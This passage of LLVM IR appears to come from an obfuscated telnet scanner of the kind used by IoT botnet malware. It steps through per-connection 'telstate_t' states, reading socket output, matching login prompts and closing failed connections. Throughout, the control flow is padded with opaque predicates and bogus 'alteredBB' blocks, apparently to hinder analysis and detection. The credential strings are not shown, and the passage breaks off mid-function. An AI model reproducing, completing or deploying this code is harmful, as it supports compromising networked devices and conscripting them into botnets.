  %1740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1739
  %1741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1740, i32 0, i32 8
  %1742 = load i8*, i8** %1741, align 8
  %1743 = load i32, i32* %2, align 4
  %1744 = sext i32 %1743 to i64
  %1745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1744
  %1746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1745, i32 0, i32 7
  %1747 = load i16, i16* %1746, align 16
  %1748 = zext i16 %1747 to i32
  %1749 = call i32 @readUntil(i32 %1737, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1742, i32 1024, i32 %1748)
  %1750 = icmp ne i32 %1749, 0
  %1751 = load i32, i32* @x.69
  %1752 = load i32, i32* @y.70
  %1753 = sub i32 %1751, 1
  %1754 = mul i32 %1751, %1753
  %1755 = urem i32 %1754, 2
  %1756 = icmp eq i32 %1755, 0
  %1757 = icmp slt i32 %1752, 10
  %1758 = or i1 %1756, %1757
  br i1 %1758, label %originalBBpart2205, label %originalBB203alteredBB

originalBBpart2205:                               ; preds = %originalBB203
  br i1 %1750, label %1759, label %1866

; <label>:1759:                                   ; preds = %originalBBpart2205
  %1760 = load i32, i32* @x.69
  %1761 = load i32, i32* @y.70
  %1762 = sub i32 %1760, 1
  %1763 = mul i32 %1760, %1762
  %1764 = urem i32 %1763, 2
  %1765 = icmp eq i32 %1764, 0
  %1766 = icmp slt i32 %1761, 10
  %1767 = or i1 %1765, %1766
  br i1 %1767, label %originalBB207, label %originalBB207alteredBB

originalBB207:                                    ; preds = %originalBB207alteredBB, %1759
  %1768 = load i32, i32* %2, align 4
  %1769 = sext i32 %1768 to i64
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1769
  %1771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1770, i32 0, i32 6
  store i32 0, i32* %1771, align 4
  %1772 = load i32, i32* %2, align 4
  %1773 = sext i32 %1772 to i64
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1773
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1774, i32 0, i32 7
  store i16 0, i16* %1775, align 16
  %1776 = load i32, i32* %2, align 4
  %1777 = sext i32 %1776 to i64
  %1778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1777
  %1779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1778, i32 0, i32 8
  %1780 = load i8*, i8** %1779, align 8
  %1781 = call i8* @strstr(i8* %1780, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1782 = icmp ne i8* %1781, null
  %1783 = load i32, i32* @x.69
  %1784 = load i32, i32* @y.70
  %1785 = sub i32 %1783, 1
  %1786 = mul i32 %1783, %1785
  %1787 = urem i32 %1786, 2
  %1788 = icmp eq i32 %1787, 0
  %1789 = icmp slt i32 %1784, 10
  %1790 = or i1 %1788, %1789
  br i1 %1790, label %originalBBpart2209, label %originalBB207alteredBB

originalBBpart2209:                               ; preds = %originalBB207
  br i1 %1782, label %1791, label %1811

; <label>:1791:                                   ; preds = %originalBBpart2209
  %1792 = load i32, i32* %2, align 4
  %1793 = sext i32 %1792 to i64
  %1794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1793
  %1795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1794, i32 0, i32 8
  %1796 = load i8*, i8** %1795, align 8
  call void @llvm.memset.p0i8.i64(i8* %1796, i8 0, i64 1024, i32 1, i1 false)
  %1797 = load i32, i32* %2, align 4
  %1798 = sext i32 %1797 to i64
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1798
  %1800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1799, i32 0, i32 0
  %1801 = load i32, i32* %1800, align 16
  %1802 = call i32 @sclose(i32 %1801)
  %1803 = load i32, i32* %2, align 4
  %1804 = sext i32 %1803 to i64
  %1805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1804
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1805, i32 0, i32 2
  store i8 0, i8* %1806, align 8
  %1807 = load i32, i32* %2, align 4
  %1808 = sext i32 %1807 to i64
  %1809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1808
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1809, i32 0, i32 3
  store i8 0, i8* %1810, align 1
  br label %3224

; <label>:1811:                                   ; preds = %originalBBpart2209
  %1812 = load i32, i32* %2, align 4
  %1813 = sext i32 %1812 to i64
  %1814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1813
  %1815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1814, i32 0, i32 8
  %1816 = load i8*, i8** %1815, align 8
  %1817 = call i32 @matchPrompt(i8* %1816)
  %1818 = icmp ne i32 %1817, 0
  br i1 %1818, label %1839, label %1819

; <label>:1819:                                   ; preds = %1811
  %1820 = load i32, i32* %2, align 4
  %1821 = sext i32 %1820 to i64
  %1822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1821
  %1823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1822, i32 0, i32 8
  %1824 = load i8*, i8** %1823, align 8
  call void @llvm.memset.p0i8.i64(i8* %1824, i8 0, i64 1024, i32 1, i1 false)
  %1825 = load i32, i32* %2, align 4
  %1826 = sext i32 %1825 to i64
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1826
  %1828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1827, i32 0, i32 0
  %1829 = load i32, i32* %1828, align 16
  %1830 = call i32 @sclose(i32 %1829)
  %1831 = load i32, i32* %2, align 4
  %1832 = sext i32 %1831 to i64
  %1833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1832
  %1834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1833, i32 0, i32 2
  store i8 0, i8* %1834, align 8
  %1835 = load i32, i32* %2, align 4
  %1836 = sext i32 %1835 to i64
  %1837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1836
  %1838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1837, i32 0, i32 3
  store i8 1, i8* %1838, align 1
  br label %3224

; <label>:1839:                                   ; preds = %1811
  %1840 = load i32, i32* @x.69
  %1841 = load i32, i32* @y.70
  %1842 = sub i32 %1840, 1
  %1843 = mul i32 %1840, %1842
  %1844 = urem i32 %1843, 2
  %1845 = icmp eq i32 %1844, 0
  %1846 = icmp slt i32 %1841, 10
  %1847 = or i1 %1845, %1846
  br i1 %1847, label %originalBB211, label %originalBB211alteredBB

originalBB211:                                    ; preds = %originalBB211alteredBB, %1839
  %1848 = load i32, i32* %2, align 4
  %1849 = sext i32 %1848 to i64
  %1850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1849
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1850, i32 0, i32 2
  store i8 7, i8* %1851, align 8
  %1852 = load i32, i32* @x.69
  %1853 = load i32, i32* @y.70
  %1854 = sub i32 %1852, 1
  %1855 = mul i32 %1852, %1854
  %1856 = urem i32 %1855, 2
  %1857 = icmp eq i32 %1856, 0
  %1858 = icmp slt i32 %1853, 10
  %1859 = or i1 %1857, %1858
  br i1 %1859, label %originalBBpart2213, label %originalBB211alteredBB

originalBBpart2213:                               ; preds = %originalBB211
  br label %1860

; <label>:1860:                                   ; preds = %originalBBpart2213
  %1861 = load i32, i32* %2, align 4
  %1862 = sext i32 %1861 to i64
  %1863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1862
  %1864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1863, i32 0, i32 8
  %1865 = load i8*, i8** %1864, align 8
  call void @llvm.memset.p0i8.i64(i8* %1865, i8 0, i64 1024, i32 1, i1 false)
  br label %3224

; <label>:1866:                                   ; preds = %originalBBpart2205
  %1867 = load i32, i32* %2, align 4
  %1868 = sext i32 %1867 to i64
  %1869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1868
  %1870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1869, i32 0, i32 0
  %1871 = load i32, i32* %1870, align 16
  %1872 = load i32, i32* %2, align 4
  %1873 = sext i32 %1872 to i64
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1873
  %1875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1874, i32 0, i32 8
  %1876 = load i8*, i8** %1875, align 8
  %1877 = load i32, i32* %2, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1878
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1879, i32 0, i32 7
  %1881 = load i16, i16* %1880, align 16
  %1882 = zext i16 %1881 to i32
  %1883 = call i32 @readUntil(i32 %1871, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1876, i32 1024, i32 %1882)
  %1884 = icmp ne i32 %1883, 0
  br i1 %1884, label %1885, label %1976

; <label>:1885:                                   ; preds = %1866
  %1886 = load i32, i32* %2, align 4
  %1887 = sext i32 %1886 to i64
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1887
  %1889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1888, i32 0, i32 6
  store i32 0, i32* %1889, align 4
  %1890 = load i32, i32* %2, align 4
  %1891 = sext i32 %1890 to i64
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1891
  %1893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1892, i32 0, i32 7
  store i16 0, i16* %1893, align 16
  %1894 = load i32, i32* %2, align 4
  %1895 = sext i32 %1894 to i64
  %1896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1895
  %1897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1896, i32 0, i32 8
  %1898 = load i8*, i8** %1897, align 8
  %1899 = call i8* @strstr(i8* %1898, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1900 = icmp ne i8* %1899, null
  br i1 %1900, label %1901, label %1921

; <label>:1901:                                   ; preds = %1885
  %1902 = load i32, i32* %2, align 4
  %1903 = sext i32 %1902 to i64
  %1904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1903
  %1905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1904, i32 0, i32 8
  %1906 = load i8*, i8** %1905, align 8
  call void @llvm.memset.p0i8.i64(i8* %1906, i8 0, i64 1024, i32 1, i1 false)
  %1907 = load i32, i32* %2, align 4
  %1908 = sext i32 %1907 to i64
  %1909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1908
  %1910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1909, i32 0, i32 0
  %1911 = load i32, i32* %1910, align 16
  %1912 = call i32 @sclose(i32 %1911)
  %1913 = load i32, i32* %2, align 4
  %1914 = sext i32 %1913 to i64
  %1915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1914
  %1916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1915, i32 0, i32 2
  store i8 0, i8* %1916, align 8
  %1917 = load i32, i32* %2, align 4
  %1918 = sext i32 %1917 to i64
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1918
  %1920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1919, i32 0, i32 3
  store i8 0, i8* %1920, align 1
  br label %3224

; <label>:1921:                                   ; preds = %1885
  %1922 = load i32, i32* %2, align 4
  %1923 = sext i32 %1922 to i64
  %1924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1923
  %1925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1924, i32 0, i32 8
  %1926 = load i8*, i8** %1925, align 8
  %1927 = call i32 @matchPrompt(i8* %1926)
  %1928 = icmp ne i32 %1927, 0
  br i1 %1928, label %1949, label %1929

; <label>:1929:                                   ; preds = %1921
  %1930 = load i32, i32* %2, align 4
  %1931 = sext i32 %1930 to i64
  %1932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1931
  %1933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1932, i32 0, i32 8
  %1934 = load i8*, i8** %1933, align 8
  call void @llvm.memset.p0i8.i64(i8* %1934, i8 0, i64 1024, i32 1, i1 false)
  %1935 = load i32, i32* %2, align 4
  %1936 = sext i32 %1935 to i64
  %1937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1936
  %1938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1937, i32 0, i32 0
  %1939 = load i32, i32* %1938, align 16
  %1940 = call i32 @sclose(i32 %1939)
  %1941 = load i32, i32* %2, align 4
  %1942 = sext i32 %1941 to i64
  %1943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1942
  %1944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1943, i32 0, i32 2
  store i8 0, i8* %1944, align 8
  %1945 = load i32, i32* %2, align 4
  %1946 = sext i32 %1945 to i64
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1946
  %1948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1947, i32 0, i32 3
  store i8 1, i8* %1948, align 1
  br label %3224

; <label>:1949:                                   ; preds = %1921
  %1950 = load i32, i32* @x.69
  %1951 = load i32, i32* @y.70
  %1952 = sub i32 %1950, 1
  %1953 = mul i32 %1950, %1952
  %1954 = urem i32 %1953, 2
  %1955 = icmp eq i32 %1954, 0
  %1956 = icmp slt i32 %1951, 10
  %1957 = or i1 %1955, %1956
  br i1 %1957, label %originalBB215, label %originalBB215alteredBB

originalBB215:                                    ; preds = %originalBB215alteredBB, %1949
  %1958 = load i32, i32* %2, align 4
  %1959 = sext i32 %1958 to i64
  %1960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1959
  %1961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1960, i32 0, i32 2
  store i8 7, i8* %1961, align 8
  %1962 = load i32, i32* @x.69
  %1963 = load i32, i32* @y.70
  %1964 = sub i32 %1962, 1
  %1965 = mul i32 %1962, %1964
  %1966 = urem i32 %1965, 2
  %1967 = icmp eq i32 %1966, 0
  %1968 = icmp slt i32 %1963, 10
  %1969 = or i1 %1967, %1968
  br i1 %1969, label %originalBBpart2217, label %originalBB215alteredBB

originalBBpart2217:                               ; preds = %originalBB215
  br label %1970

; <label>:1970:                                   ; preds = %originalBBpart2217
  %1971 = load i32, i32* %2, align 4
  %1972 = sext i32 %1971 to i64
  %1973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1972
  %1974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1973, i32 0, i32 8
  %1975 = load i8*, i8** %1974, align 8
  call void @llvm.memset.p0i8.i64(i8* %1975, i8 0, i64 1024, i32 1, i1 false)
  br label %3224

; <label>:1976:                                   ; preds = %1866
  %1977 = load i32, i32* @x.69
  %1978 = load i32, i32* @y.70
  %1979 = sub i32 %1977, 1
  %1980 = mul i32 %1977, %1979
  %1981 = urem i32 %1980, 2
  %1982 = icmp eq i32 %1981, 0
  %1983 = icmp slt i32 %1978, 10
  %1984 = or i1 %1982, %1983
  br i1 %1984, label %originalBB219, label %originalBB219alteredBB

originalBB219:                                    ; preds = %originalBB219alteredBB, %1976
  %1985 = load i32, i32* %2, align 4
  %1986 = sext i32 %1985 to i64
  %1987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1986
  %1988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1987, i32 0, i32 0
  %1989 = load i32, i32* %1988, align 16
  %1990 = load i32, i32* %2, align 4
  %1991 = sext i32 %1990 to i64
  %1992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1991
  %1993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1992, i32 0, i32 8
  %1994 = load i8*, i8** %1993, align 8
  %1995 = load i32, i32* %2, align 4
  %1996 = sext i32 %1995 to i64
  %1997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1996
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1997, i32 0, i32 7
  %1999 = load i16, i16* %1998, align 16
  %2000 = zext i16 %1999 to i32
  %2001 = call i32 @readUntil(i32 %1989, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1994, i32 1024, i32 %2000)
  %2002 = icmp ne i32 %2001, 0
  %2003 = load i32, i32* @x.69
  %2004 = load i32, i32* @y.70
  %2005 = sub i32 %2003, 1
  %2006 = mul i32 %2003, %2005
  %2007 = urem i32 %2006, 2
  %2008 = icmp eq i32 %2007, 0
  %2009 = icmp slt i32 %2004, 10
  %2010 = or i1 %2008, %2009
  br i1 %2010, label %originalBBpart2221, label %originalBB219alteredBB

originalBBpart2221:                               ; preds = %originalBB219
  br i1 %2002, label %2011, label %2074

; <label>:2011:                                   ; preds = %originalBBpart2221
  %2012 = load i32, i32* @x.69
  %2013 = load i32, i32* @y.70
  %2014 = sub i32 %2012, 1
  %2015 = mul i32 %2012, %2014
  %2016 = urem i32 %2015, 2
  %2017 = icmp eq i32 %2016, 0
  %2018 = icmp slt i32 %2013, 10
  %2019 = or i1 %2017, %2018
  br i1 %2019, label %originalBB223, label %originalBB223alteredBB

originalBB223:                                    ; preds = %originalBB223alteredBB, %2011
  %2020 = load i32, i32* %2, align 4
  %2021 = sext i32 %2020 to i64
  %2022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2021
  %2023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2022, i32 0, i32 6
  store i32 0, i32* %2023, align 4
  %2024 = load i32, i32* %2, align 4
  %2025 = sext i32 %2024 to i64
  %2026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2025
  %2027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2026, i32 0, i32 7
  store i16 0, i16* %2027, align 16
  %2028 = load i32, i32* %2, align 4
  %2029 = sext i32 %2028 to i64
  %2030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2029
  %2031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2030, i32 0, i32 8
  %2032 = load i8*, i8** %2031, align 8
  %2033 = call i8* @strstr(i8* %2032, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %2034 = icmp ne i8* %2033, null
  %2035 = load i32, i32* @x.69
  %2036 = load i32, i32* @y.70
  %2037 = sub i32 %2035, 1
  %2038 = mul i32 %2035, %2037
  %2039 = urem i32 %2038, 2
  %2040 = icmp eq i32 %2039, 0
  %2041 = icmp slt i32 %2036, 10
  %2042 = or i1 %2040, %2041
  br i1 %2042, label %originalBBpart2225, label %originalBB223alteredBB

originalBBpart2225:                               ; preds = %originalBB223
  br i1 %2034, label %2043, label %2063

; <label>:2043:                                   ; preds = %originalBBpart2225
  %2044 = load i32, i32* %2, align 4
  %2045 = sext i32 %2044 to i64
  %2046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2045
  %2047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2046, i32 0, i32 8
  %2048 = load i8*, i8** %2047, align 8
  call void @llvm.memset.p0i8.i64(i8* %2048, i8 0, i64 1024, i32 1, i1 false)
  %2049 = load i32, i32* %2, align 4
  %2050 = sext i32 %2049 to i64
  %2051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2050
  %2052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2051, i32 0, i32 0
  %2053 = load i32, i32* %2052, align 16
  %2054 = call i32 @sclose(i32 %2053)
  %2055 = load i32, i32* %2, align 4
  %2056 = sext i32 %2055 to i64
  %2057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2056
  %2058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2057, i32 0, i32 2
  store i8 0, i8* %2058, align 8
  %2059 = load i32, i32* %2, align 4
  %2060 = sext i32 %2059 to i64
  %2061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2060
  %2062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2061, i32 0, i32 3
  store i8 0, i8* %2062, align 1
  br label %3224

; <label>:2063:                                   ; preds = %originalBBpart2225
  %2064 = load i32, i32* %2, align 4
  %2065 = sext i32 %2064 to i64
  %2066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2065
  %2067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2066, i32 0, i32 2
  store i8 7, i8* %2067, align 8
  br label %2068

; <label>:2068:                                   ; preds = %2063
  %2069 = load i32, i32* %2, align 4
  %2070 = sext i32 %2069 to i64
  %2071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2070
  %2072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2071, i32 0, i32 8
  %2073 = load i8*, i8** %2072, align 8
  call void @llvm.memset.p0i8.i64(i8* %2073, i8 0, i64 1024, i32 1, i1 false)
  br label %3224

; <label>:2074:                                   ; preds = %originalBBpart2221
  %2075 = load i32, i32* %2, align 4
  %2076 = sext i32 %2075 to i64
  %2077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2076
  %2078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2077, i32 0, i32 0
  %2079 = load i32, i32* %2078, align 16
  %2080 = load i32, i32* %2, align 4
  %2081 = sext i32 %2080 to i64
  %2082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2081
  %2083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2082, i32 0, i32 8
  %2084 = load i8*, i8** %2083, align 8
  %2085 = load i32, i32* %2, align 4
  %2086 = sext i32 %2085 to i64
  %2087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2086
  %2088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2087, i32 0, i32 7
  %2089 = load i16, i16* %2088, align 16
  %2090 = zext i16 %2089 to i32
  %2091 = call i32 @readUntil(i32 %2079, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2084, i32 1024, i32 %2090)
  %2092 = icmp ne i32 %2091, 0
  br i1 %2092, label %2093, label %2172

; <label>:2093:                                   ; preds = %2074
  %2094 = load i32, i32* @x.69
  %2095 = load i32, i32* @y.70
  %2096 = sub i32 %2094, 1
  %2097 = mul i32 %2094, %2096
  %2098 = urem i32 %2097, 2
  %2099 = icmp eq i32 %2098, 0
  %2100 = icmp slt i32 %2095, 10
  %2101 = or i1 %2099, %2100
  br i1 %2101, label %originalBB227, label %originalBB227alteredBB

originalBB227:                                    ; preds = %originalBB227alteredBB, %2093
  %2102 = load i32, i32* %2, align 4
  %2103 = sext i32 %2102 to i64
  %2104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2103
  %2105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2104, i32 0, i32 6
  store i32 0, i32* %2105, align 4
  %2106 = load i32, i32* %2, align 4
  %2107 = sext i32 %2106 to i64
  %2108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2107
  %2109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2108, i32 0, i32 7
  store i16 0, i16* %2109, align 16
  %2110 = load i32, i32* %2, align 4
  %2111 = sext i32 %2110 to i64
  %2112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2111
  %2113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2112, i32 0, i32 8
  %2114 = load i8*, i8** %2113, align 8
  %2115 = call i8* @strstr(i8* %2114, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %2116 = icmp ne i8* %2115, null
  %2117 = load i32, i32* @x.69
  %2118 = load i32, i32* @y.70
  %2119 = sub i32 %2117, 1
  %2120 = mul i32 %2117, %2119
  %2121 = urem i32 %2120, 2
  %2122 = icmp eq i32 %2121, 0
  %2123 = icmp slt i32 %2118, 10
  %2124 = or i1 %2122, %2123
  br i1 %2124, label %originalBBpart2229, label %originalBB227alteredBB

originalBBpart2229:                               ; preds = %originalBB227
  br i1 %2116, label %2125, label %2161

; <label>:2125:                                   ; preds = %originalBBpart2229
  %2126 = load i32, i32* @x.69
  %2127 = load i32, i32* @y.70
  %2128 = sub i32 %2126, 1
  %2129 = mul i32 %2126, %2128
  %2130 = urem i32 %2129, 2
  %2131 = icmp eq i32 %2130, 0
  %2132 = icmp slt i32 %2127, 10
  %2133 = or i1 %2131, %2132
  br i1 %2133, label %originalBB231, label %originalBB231alteredBB

originalBB231:                                    ; preds = %originalBB231alteredBB, %2125
  %2134 = load i32, i32* %2, align 4
  %2135 = sext i32 %2134 to i64
  %2136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2135
  %2137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2136, i32 0, i32 8
  %2138 = load i8*, i8** %2137, align 8
  call void @llvm.memset.p0i8.i64(i8* %2138, i8 0, i64 1024, i32 1, i1 false)
  %2139 = load i32, i32* %2, align 4
  %2140 = sext i32 %2139 to i64
  %2141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2140
  %2142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2141, i32 0, i32 0
  %2143 = load i32, i32* %2142, align 16
  %2144 = call i32 @sclose(i32 %2143)
  %2145 = load i32, i32* %2, align 4
  %2146 = sext i32 %2145 to i64
  %2147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2146
  %2148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2147, i32 0, i32 2
  store i8 0, i8* %2148, align 8
  %2149 = load i32, i32* %2, align 4
  %2150 = sext i32 %2149 to i64
  %2151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2150
  %2152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2151, i32 0, i32 3
  store i8 0, i8* %2152, align 1
  %2153 = load i32, i32* @x.69
  %2154 = load i32, i32* @y.70
  %2155 = sub i32 %2153, 1
  %2156 = mul i32 %2153, %2155
  %2157 = urem i32 %2156, 2
  %2158 = icmp eq i32 %2157, 0
  %2159 = icmp slt i32 %2154, 10
  %2160 = or i1 %2158, %2159
  br i1 %2160, label %originalBBpart2233, label %originalBB231alteredBB

originalBBpart2233:                               ; preds = %originalBB231
  br label %3224

; <label>:2161:                                   ; preds = %originalBBpart2229
  %2162 = load i32, i32* %2, align 4
  %2163 = sext i32 %2162 to i64
  %2164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2163
  %2165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2164, i32 0, i32 2
  store i8 7, i8* %2165, align 8
  br label %2166

; <label>:2166:                                   ; preds = %2161
  %2167 = load i32, i32* %2, align 4
  %2168 = sext i32 %2167 to i64
  %2169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2168
  %2170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2169, i32 0, i32 8
  %2171 = load i8*, i8** %2170, align 8
  call void @llvm.memset.p0i8.i64(i8* %2171, i8 0, i64 1024, i32 1, i1 false)
  br label %3224

; <label>:2172:                                   ; preds = %2074
  %2173 = load i32, i32* %2, align 4
  %2174 = sext i32 %2173 to i64
  %2175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2174
  %2176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2175, i32 0, i32 0
  %2177 = load i32, i32* %2176, align 16
  %2178 = load i32, i32* %2, align 4
  %2179 = sext i32 %2178 to i64
  %2180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2179
  %2181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2180, i32 0, i32 8
  %2182 = load i8*, i8** %2181, align 8
  %2183 = load i32, i32* %2, align 4
  %2184 = sext i32 %2183 to i64
  %2185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2184
  %2186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2185, i32 0, i32 7
  %2187 = load i16, i16* %2186, align 16
  %2188 = zext i16 %2187 to i32
  %2189 = call i32 @readUntil(i32 %2177, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2182, i32 1024, i32 %2188)
  %2190 = icmp ne i32 %2189, 0
  br i1 %2190, label %2191, label %2270

; <label>:2191:                                   ; preds = %2172
  %2192 = load i32, i32* %2, align 4
  %2193 = sext i32 %2192 to i64
